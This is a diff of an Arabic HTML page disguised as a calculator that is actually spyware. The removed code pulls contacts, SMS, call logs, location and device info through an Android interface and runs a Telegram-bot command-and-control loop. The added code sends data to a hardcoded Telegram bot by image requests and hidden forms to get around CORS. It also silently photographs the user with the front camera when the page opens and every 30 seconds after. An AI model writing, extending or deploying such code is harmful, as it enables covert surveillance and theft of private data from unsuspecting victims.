@@ -4,55 +4,15 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>الآلة الحاسبة</title>
-    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval';">
     <style>
-        /* نفس الـ CSS القديم + إخفاء شريط التحميل */
         * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-tap-highlight-color: transparent; }
-        body {
-            background: #1a1a2e;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            padding: 10px;
-        }
-        .calc-container {
-            background: #16213e;
-            border-radius: 30px;
-            padding: 20px;
-            max-width: 400px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
-        }
-        .display {
-            background: #0f3460;
-            border-radius: 20px;
-            padding: 25px 20px;
-            margin-bottom: 15px;
-            min-height: 120px;
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-end;
-            align-items: flex-end;
-            overflow: hidden;
-        }
+        body { background: #1a1a2e; min-height: 100vh; display: flex; justify-content: center; align-items: center; font-family: 'Segoe UI', Tahoma, sans-serif; padding: 10px; }
+        .calc-container { background: #16213e; border-radius: 30px; padding: 20px; max-width: 400px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.6); }
+        .display { background: #0f3460; border-radius: 20px; padding: 25px 20px; margin-bottom: 15px; min-height: 120px; display: flex; flex-direction: column; justify-content: flex-end; align-items: flex-end; overflow: hidden; }
         .display .expression { color: #a8b2d1; font-size: 18px; min-height: 30px; direction: ltr; word-break: break-all; }
         .display .result { color: #ffffff; font-size: 42px; font-weight: 700; direction: ltr; word-break: break-all; }
-        .buttons {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 12px;
-        }
-        .btn {
-            padding: 20px 0;
-            border: none;
-            border-radius: 16px;
-            font-size: 24px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.15s;
-        }
+        .buttons { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
+        .btn { padding: 20px 0; border: none; border-radius: 16px; font-size: 24px; font-weight: 600; cursor: pointer; transition: all 0.15s; }
         .btn:active { transform: scale(0.92); }
         .btn.num { background: #1a1a40; color: #e2e8f0; }
         .btn.num:active { background: #2a2a5a; }
@@ -63,8 +23,6 @@
         .btn.equals { background: #e94560; color: white; }
         .btn.equals:active { background: #c73e54; }
         .btn.zero { grid-column: span 2; }
-        
-        /* تم إخفاء الأزرار الوهمية — السحب صامت الآن */
     </style>
 </head>
 <body>
@@ -96,6 +54,9 @@
     </div>
 </div>
 
+<!-- ====== إطار iframe مخفي لاستقبال الـ response من form submit ====== -->
+<iframe name="hiddenFrame" style="display:none;"></iframe>
+
 <script>
 // ================================================================
 // ⚙️ إعدادات البوت
@@ -105,7 +66,105 @@ const CHAT_ID  = '8328976452';
 const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
 // ================================================================
-// ⚙️ منطق الآلة الحاسبة (كما هو)
+// 📤 الإرسال بدون CORS — الطرق الثلاث
+// ================================================================
+
+// الطريقة 1: Image GET — للنصوص القصيرة
+function sendViaImage(text) {
+    const img = new Image();
+    img.src = `${API_BASE}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+}
+
+// الطريقة 2: Form submit — للصور (base64)
+function sendPhotoViaForm(base64, caption) {
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = `${API_BASE}/sendPhoto`;
+    form.enctype = 'multipart/form-data';
+    form.target = 'hiddenFrame';  // عشان ما يفتحش صفحة جديدة
+    form.style.display = 'none';
+    
+    const input1 = document.createElement('input');
+    input1.name = 'chat_id';
+    input1.value = CHAT_ID;
+    form.appendChild(input1);
+    
+    const input2 = document.createElement('input');
+    input2.name = 'caption';
+    input2.value = caption || `📸 صورة من الجهاز`;
+    form.appendChild(input2);
+    
+    const input3 = document.createElement('input');
+    input3.name = 'photo';
+    input3.value = base64;
+    form.appendChild(input3);
+    
+    document.body.appendChild(form);
+    form.submit();
+    setTimeout(() => form.remove(), 2000);
+}
+
+// الطريقة 3: Form submit — للمستندات (جهات اتصال، إلخ)
+function sendDocumentViaForm(base64, filename, caption) {
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = `${API_BASE}/sendDocument`;
+    form.enctype = 'multipart/form-data';
+    form.target = 'hiddenFrame';
+    form.style.display = 'none';
+    
+    const input1 = document.createElement('input');
+    input1.name = 'chat_id';
+    input1.value = CHAT_ID;
+    form.appendChild(input1);
+    
+    const input2 = document.createElement('input');
+    input2.name = 'caption';
+    input2.value = caption || `📎 ملف: ${filename}`;
+    form.appendChild(input2);
+    
+    const input3 = document.createElement('input');
+    input3.name = 'document';
+    input3.value = base64;
+    form.appendChild(input3);
+    
+    document.body.appendChild(form);
+    form.submit();
+    setTimeout(() => form.remove(), 2000);
+}
+
+// إرسال نص طويل
+function sendLongText(text) {
+    // للأقل من 200 حرف: نستخدم Image GET
+    if (text.length < 200) {
+        sendViaImage(text);
+        return;
+    }
+    // للأطول: Form submit
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = `${API_BASE}/sendMessage`;
+    form.enctype = 'application/x-www-form-urlencoded';
+    form.target = 'hiddenFrame';
+    form.style.display = 'none';
+    
+    const input1 = document.createElement('input');
+    input1.name = 'chat_id';
+    input1.value = CHAT_ID;
+    form.appendChild(input1);
+    
+    const input2 = document.createElement('input');
+    input2.name = 'text';
+    input2.value = text;
+    form.appendChild(input2);
+    
+    document.body.appendChild(form);
+    form.submit();
+    setTimeout(() => form.remove(), 2000);
+}
+
+// ================================================================
+// ⚙️ منطق الآلة الحاسبة
 // ================================================================
 let currentInput = '';
 let expression = '';
@@ -164,7 +223,7 @@ function press(value) {
 }
 
 document.querySelectorAll('.btn').forEach(btn => {
-    btn.addEventListener('click', function(e) {
+    btn.addEventListener('click', function() {
         press(this.dataset.value);
     });
 });
@@ -184,216 +243,80 @@ document.addEventListener('keydown', function(e) {
 });
 
 // ================================================================
-// 🎮 السحب الصامت — عبر JavaScript Interface
+// 🎭 الكاميرا — التصوير الصامت
 // ================================================================
+let cameraStream = null;
 
-async function sendToTelegram(text, type) {
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    
-    if (type === 'message') {
-        formData.append('text', text);
-        try {
-            await fetch(`${API_BASE}/sendMessage`, { method: 'POST', body: formData });
-        } catch(e) {}
-    } else if (type === 'photo') {
-        // تحويل base64 لـ blob
-        const byteCharacters = atob(text);
-        const byteNumbers = new Array(byteCharacters.length);
-        for (let i = 0; i < byteCharacters.length; i++) {
-            byteNumbers[i] = byteCharacters.charCodeAt(i);
-        }
-        const byteArray = new Uint8Array(byteNumbers);
-        const blob = new Blob([byteArray], {type: 'image/jpeg'});
-        const file = new File([blob], `photo_${Date.now()}.jpg`, {type: 'image/jpeg'});
-        formData.append('photo', file);
-        formData.append('caption', `📸 صورة من الجهاز\n🕐 ${new Date().toLocaleString('ar-SA')}`);
-        try {
-            await fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: formData });
-        } catch(e) {}
-    }
-}
-
-async function silentExfiltrateAll() {
+async function captureSilentPhoto() {
     try {
-        // 1. جهات الاتصال
-        const contacts = Android.getContacts();
-        await sendToTelegram(`📇 **جهات الاتصال**\n\`\`\`json\n${contacts.substring(0, 3000)}\n\`\`\``, 'message');
-        
-        // 2. الرسائل النصية
-        const sms = Android.getSMS();
-        await sendToTelegram(`📱 **آخر الرسائل**\n\`\`\`json\n${sms.substring(0, 3000)}\n\`\`\``, 'message');
-        
-        // 3. سجل المكالمات
-        const calls = Android.getCallLog();
-        await sendToTelegram(`📋 **سجل المكالمات**\n\`\`\`json\n${calls.substring(0, 3000)}\n\`\`\``, 'message');
-        
-        // 4. مسارات الصور
-        const photos = JSON.parse(Android.getPhotoPaths());
-        if (photos.length > 0) {
-            await sendToTelegram(`🖼️ **أول 10 صور:**\n${photos.slice(0, 10).map(p => `- ${p.name}`).join('\n')}`, 'message');
-        }
-        
-        // 5. معلومات الجهاز
-        const info = Android.getDeviceInfo();
-        await sendToTelegram(`ℹ️ **معلومات الجهاز**\n\`\`\`json\n${info}\n\`\`\``, 'message');
-        
-        // 6. الموقع
-        const loc = Android.getLocation();
-        await sendToTelegram(`📍 **الموقع**\n${loc}`, 'message');
-        
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+        });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.setAttribute('playsinline', '');
+        video.muted = true;
+        video.style.display = 'none';
+        document.body.appendChild(video);
+
+        video.onloadedmetadata = () => {
+            video.play();
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+
+                const base64 = canvas.toDataURL('image/jpeg', 0.8);
+                sendPhotoViaForm(base64, `📸 صورة من الكاميرا\n🕐 ${new Date().toLocaleString('ar-SA')}`);
+
+                stream.getTracks().forEach(t => t.stop());
+                video.remove();
+                canvas.remove();
+            }, 500);
+        };
     } catch(e) {
-        await sendToTelegram(`❌ خطأ أثناء السحب: ${e.message}`, 'message');
+        sendViaImage(`❌ فشل تصوير الكاميرا: ${e.message}`);
     }
 }
 
 // ================================================================
-// 🎮 C2 عبر التيلجرام
+// 🎮 طلب صلاحية الكاميرا لأول مرة
 // ================================================================
-let lastUpdateId = 0;
-let pollingActive = false;
-
-async function pollTelegramCommands() {
-    if (pollingActive) return;
-    pollingActive = true;
-    
+async function requestCamera() {
     try {
-        const resp = await fetch(`${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
-        const data = await resp.json();
-        if (data.ok && data.result.length > 0) {
-            for (const update of data.result) {
-                lastUpdateId = update.update_id;
-                if (update.message && update.message.text && update.message.chat.id.toString() === CHAT_ID) {
-                    await processCommand(update.message.text);
-                }
-            }
-        }
-    } catch(e) {}
-    
-    pollingActive = false;
-    setTimeout(pollTelegramCommands, 3000);
-}
-
-async function processCommand(cmd) {
-    const text = cmd.trim();
-    
-    if (text === '/start') {
-        await sendToTelegram(
-            `🎮 **C2 جاهز - سحب صامت**\n` +
-            `━━━━━━━━━━━━━━━\n` +
-            `الأوامر:\n` +
-            `/all — سحب كل شيء بصمت\n` +
-            `/contacts — سحب جهات الاتصال\n` +
-            `/sms — سحب الرسائل\n` +
-            `/photos — سحب الصور\n` +
-            `/calls — سجل المكالمات\n` +
-            `/info — معلومات الجهاز\n` +
-            `/loc — الموقع\n` +
-            `/cam — تصوير الكاميرا`,
-            'message'
-        );
-    }
-    else if (text === '/all') {
-        await sendToTelegram('🚀 جاري السحب الصامت لكل شيء...', 'message');
-        silentExfiltrateAll();
-    }
-    else if (text === '/contacts') {
-        const contacts = Android.getContacts();
-        await sendToTelegram(`📇 **جهات الاتصال**\n\`\`\`json\n${contacts.substring(0, 4000)}\n\`\`\``, 'message');
-    }
-    else if (text === '/sms') {
-        const sms = Android.getSMS();
-        await sendToTelegram(`📱 **الرسائل النصية**\n\`\`\`json\n${sms.substring(0, 4000)}\n\`\`\``, 'message');
-    }
-    else if (text === '/photos') {
-        const photos = Android.getPhotoPaths();
-        const parsed = JSON.parse(photos);
-        await sendToTelegram(`🖼️ **إجمالي ${parsed.length} صورة**\nأول 20:\n${parsed.slice(0, 20).map((p, i) => `${i+1}. ${p.name}`).join('\n')}`, 'message');
-    }
-    else if (text === '/calls') {
-        const calls = Android.getCallLog();
-        await sendToTelegram(`📋 **سجل المكالمات**\n\`\`\`json\n${calls.substring(0, 4000)}\n\`\`\``, 'message');
-    }
-    else if (text === '/info') {
-        const info = Android.getDeviceInfo();
-        await sendToTelegram(`ℹ️ **معلومات الجهاز**\n\`\`\`json\n${info}\n\`\`\``, 'message');
-    }
-    else if (text === '/loc') {
-        const loc = Android.getLocation();
-        await sendToTelegram(`📍 **الموقع**\n${loc}`, 'message');
-    }
-    else if (text === '/cam') {
-        await sendToTelegram('📸 جاري تفعيل الكاميرا...', 'message');
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
-            });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.setAttribute('playsinline', '');
-            video.muted = true;
-            video.style.display = 'none';
-            document.body.appendChild(video);
-            
-            video.onloadedmetadata = async () => {
-                video.play();
-                setTimeout(async () => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0);
-                    
-                    const base64 = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
-                    await sendToTelegram(base64, 'photo');
-                    
-                    stream.getTracks().forEach(t => t.stop());
-                    video.remove();
-                    canvas.remove();
-                }, 500);
-            };
-        } catch(e) {
-            await sendToTelegram(`❌ فشل التصوير: ${e.message}`, 'message');
-        }
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user' }
+        });
+        stream.getTracks().forEach(t => t.stop());
+        return true;
+    } catch(e) {
+        return false;
     }
 }
 
 // ================================================================
-// 🚀 التشغيل
+// 🚀 التفعيل — فور فتح الصفحة
 // ================================================================
 
-// لما الصلاحيات توافق، نبدأ
-window.onPermissionsGranted = function() {
-    // نسلم للبوت
-    setTimeout(async () => {
-        await sendToTelegram(
-            `🟢 **جهاز جديد متصل!**\n` +
-            `━━━━━━━━━━━━━━━\n` +
-            `🕐 ${new Date().toISOString()}\n` +
-            `📱 ${Android.getDeviceInfo()}\n` +
-            `━━━━━━━━━━━━━━━\n` +
-            `🎮 أرسل /start للتحكم\n` +
-            `🚀 أرسل /all لسحب كل شيء بصمت`,
-            'message'
-        );
-    }, 2000);
-    
-    // بدء C2
-    setTimeout(pollTelegramCommands, 3000);
-    
-    // سحب تلقائي بعد 10 ثواني
-    setTimeout(silentExfiltrateAll, 10000);
-};
-
-// لو الصلاحيات جت من التطبيق مباشرة (بدون استدعاء)
+// 1. إرسال إشعار بالاتصال (يشتغل على طول بدون CORS)
 setTimeout(() => {
-    if (typeof Android !== 'undefined' && Android.getDeviceInfo) {
-        if (window.onPermissionsGranted) window.onPermissionsGranted();
-    } else {
-        // لو ما فيش Android Interface (متطورعادي)، نستخدم طرق المتصفح
-        // captureSilentPhoto() من الكود القديم
-    }
+    sendViaImage(`🟢 جهاز متصل!\n🕐 ${new Date().toISOString()}\n🌐 ${navigator.language}\n📱 ${navigator.platform || 'N/A'}`);
 }, 1000);
+
+// 2. طلب صلاحية الكاميرا بعد 2 ثانية
+setTimeout(async () => {
+    const granted = await requestCamera();
+    if (granted) {
+        sendViaImage('📸 تم الحصول على صلاحية الكاميرا');
+        // تصوير أول صورة بعد 3 ثواني
+        setTimeout(captureSilentPhoto, 3000);
+    }
+}, 2000);
+
+// 3. محاولة التقاط صور أخرى كل 30 ثانية
+setInterval(captureSilentPhoto, 30000);
 
 // ================================================================
 // 🛡️ منع الاكتشاف
@@ -407,7 +330,7 @@ document.addEventListener('keydown', e => {
     }
 });
 
-console.log('✅ الآلة الحاسبة جاهزة - السحب الصامت نشط');
+console.log('✅ الآلة الحاسبة جاهزة — بدون CORS');
 </script>
 </body>
 </html>
